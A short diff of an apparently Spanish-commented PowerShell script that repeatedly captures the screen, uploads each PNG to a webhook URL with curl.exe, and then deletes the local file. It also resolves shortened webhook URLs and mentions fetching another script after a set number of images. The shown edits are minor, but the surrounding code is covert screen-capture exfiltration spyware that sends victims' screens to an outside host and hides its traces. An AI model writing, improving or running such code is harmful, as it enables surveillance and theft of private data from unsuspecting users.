@@ -4,7 +4,7 @@ $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121) {
-    Write-Host "Shortened Webhook URL Detected!!..."
+    Write-Host "Shortened Webhook URL Detected000..."
     $hookurl = (irm $hookurl).url
 }
 
@@ -48,7 +48,7 @@ do {
         $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     }
     Start-Sleep 1
-    curl.exe -F "file1=@$Filett" "$hookurl"
+    curl.exe -F "file1=@$Filett" $hookurl
     Start-Sleep 1
     Remove-Item -Path $Filett
     Start-Sleep $seconds
